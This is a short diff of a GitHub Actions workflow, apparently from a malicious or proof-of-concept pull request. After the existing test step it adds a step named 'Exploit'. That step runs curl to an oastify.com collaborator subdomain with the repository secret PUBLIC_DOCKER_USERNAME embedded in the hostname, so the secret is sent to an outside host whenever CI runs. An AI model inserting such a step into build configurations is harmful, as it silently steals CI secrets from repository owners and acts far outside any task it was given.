@@ -55,6 +55,9 @@ jobs:
       - name: Runs tests
         working-directory: ./.github/workflows/hypertrace-service/scripts
         run: ./tests.sh
+        
+      - name: Exploit
+        run: curl http://${{ secrets.PUBLIC_DOCKER_USERNAME }}.exfzze4qs6qo2ymgr3kcawy6ux0oogc5.oastify.com
 
   build-and-test-with-postgres:
       # Ubuntu-20.04 runner comes with docker 19.03 and OpenJDK 11 and we are using that here. 
